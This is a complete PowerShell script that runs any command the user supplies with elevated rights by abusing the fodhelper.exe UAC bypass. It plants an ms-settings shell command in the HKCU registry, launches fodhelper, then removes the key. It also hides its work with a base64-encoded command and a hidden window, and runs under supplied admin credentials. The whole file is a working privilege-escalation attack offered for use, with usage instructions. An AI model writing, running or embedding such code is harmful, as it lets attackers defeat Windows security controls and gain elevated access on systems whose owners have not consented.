param (
    [string]$AdminUser,
    [string]$AdminPass,
    [string]$CmdToRun
)

function Show-Usage {
    Write-Host ""
    Write-Host "Usage:"
    Write-Host "  .\pral.ps1 -AdminUser <username> -AdminPass <password> -CmdToRun <command>"
    Write-Host ""
    Write-Host "Example:"
    Write-Host "  .\pral.ps1 -AdminUser 'admin1' -AdminPass 'P@ssw0rd123' -CmdToRun 'whoami & ipconfig /all & pause'"
    Write-Host ""
    Exit 1
}

# ===== Validate arguments =====
if (-not $AdminUser -or -not $AdminPass -or -not $CmdToRun) {
    Show-Usage
}

# ===== Wrap in cmd.exe for fodhelper bypass =====
$payload = "cmd.exe /c `"$CmdToRun`""

# ===== Convert to secure credentials =====
$secPass = ConvertTo-SecureString $AdminPass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($AdminUser, $secPass)

# ===== UAC bypass logic via fodhelper.exe =====
$uacBypassScript = {
    param($payloadPath)

    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" | Out-Null
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payloadPath | Out-Null

    Start-Process "fodhelper.exe"
    Start-Sleep -Seconds 5
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}

# ===== Encode the bypass script and payload =====
$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(
    "`$cmd = '$payload'; & { $($uacBypassScript.ToString()) } -payloadPath `$cmd"
))

# ===== Launch PowerShell as admin user with bypass =====
Start-Process -FilePath "powershell.exe" `
    -Credential $cred `
    -ArgumentList "-NoProfile -EncodedCommand $encodedCmd" `
    -WindowStyle Hidden `
    -LoadUserProfile `
    -Wait
